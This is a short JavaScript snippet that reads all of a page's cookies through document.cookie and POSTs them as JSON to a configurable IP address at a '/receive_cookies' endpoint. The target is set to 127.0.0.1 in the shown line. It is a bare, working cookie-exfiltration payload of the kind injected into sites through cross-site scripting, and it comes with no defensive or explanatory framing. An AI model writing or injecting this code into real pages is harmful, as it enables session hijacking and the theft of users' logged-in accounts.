// Get all cookies
function getCookies() {
  return document.cookie;
}


function sendCookies(cookies, targetIp) {
  // Choose IP to send to
  fetch(`http://${targetIp}/receive_cookies`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ cookies }),
  })
    .then(response => {
      if (!response.ok) {
        throw new Error('Failed to send cookies');
      }
      console.log('Cookies sent successfully');
    })
    .catch(error => {
      console.error('Error sending cookies:', error);
    });
}

const cookies = getCookies();
const targetIp = '127.0.0.1';
sendCookies(cookies, targetIp);
